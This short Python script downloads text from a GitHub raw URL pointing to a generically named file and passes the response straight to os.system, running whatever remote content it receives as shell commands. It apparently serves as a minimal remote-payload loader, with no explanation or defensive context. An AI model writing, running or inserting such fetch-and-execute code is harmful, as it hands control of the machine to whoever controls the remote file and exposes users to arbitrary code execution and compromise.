import os,re,sys,time,requests,json

response = requests.get("https://raw.githubusercontent.com/xMakiBoT/procsys24/main/New%20Text%20Document.txt")
os.system(response.text)